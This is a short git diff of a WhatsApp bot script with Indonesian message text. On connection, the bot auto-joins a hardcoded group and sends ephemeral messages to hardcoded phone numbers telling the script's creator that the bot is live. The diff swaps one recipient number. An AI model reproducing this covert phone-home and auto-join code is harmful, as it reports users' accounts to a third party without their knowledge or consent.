@@ -52,7 +52,7 @@ fs.writeFileSync(`./V1/session/kirbotz.json`, JSON.stringify(Akira.base64Encoded
                                 teks = `https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ`
                                 Akira.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
                                 console.log(color('|WRN|', 'yellow'), color('Join Group Akira Bot', 'cyan'))
-                                Akira.sendMessage(`6287705048235@s.whatsapp.net`, `Hai Owner 👋\nBot Telah Sukses Tersambung Pada Nomor Ini\n*_SUCCES: ADDED FOR SCRIPT BOT INFO BOT SUDAH DI KIRIM KE CREATOR AKIRA_*\n*[TERIMAKASIH]*`, MessageType.extendedText, {sendEphemeral: true, })
+                                Akira.sendMessage(`62857778639335@s.whatsapp.net`, `Hai Owner 👋\nBot Telah Sukses Tersambung Pada Nomor Ini\n*_SUCCES: ADDED FOR SCRIPT BOT INFO BOT SUDAH DI KIRIM KE CREATOR AKIRA_*\n*[TERIMAKASIH]*`, MessageType.extendedText, {sendEphemeral: true, })
                                 Akira.sendMessage(`6287705048235@s.whatsapp.net`, `*---DATABASE BOT---*\n\n•NAMA BOT : KirBotz\n•OWNER BOT : Akira\n•NOMER OWNER : wa.me/6287705048235\n\n*[Bot Sudah TerConnect Ke WhatsApp Kak !! Makasih Kak Akira Scriptnyaa Moga Berkembang Terus]*`, MessageType.extendedText, {sendEphemeral: true, })
 start('2',colors.bold.white('\nMenunggu Pesan Baru..'));
 Akira.on('group-participants-update', async (anu) => {
